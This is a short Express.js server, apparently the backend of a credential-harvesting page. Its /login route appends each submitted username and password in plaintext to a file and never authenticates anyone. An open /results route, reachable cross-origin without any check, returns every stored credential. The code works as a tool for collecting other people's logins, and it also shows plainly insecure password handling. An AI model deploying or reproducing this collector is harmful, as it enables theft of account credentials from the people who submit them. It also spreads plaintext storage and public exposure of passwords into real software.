const express = require('express');
const app = express();
const port = process.env.PORT;
const cors = require('cors');
const fileSystrm = require('fs');

app.use(cors());
app.use(express.json());

app.post('/login', (req, res) => {
  // write details to a file
  fileSystrm.writeFile('data.txt', JSON.stringify(`{UserName: ${req.body.userName}, Password: ${req.body.password}}`), { flag: 'a+' }, error => {
    if (error) console.log(error);
  })
  res.send(req.body.password);
});

app.get('/results', (req, res) => {
  fileSystrm.readFile('data.txt', 'utf-8',(error, data) => {
    if (error) console.log(error)
    else res.json(data)
  })
});

app.listen(port, () => {
  console.log(`server is running on port ${port}`);
});

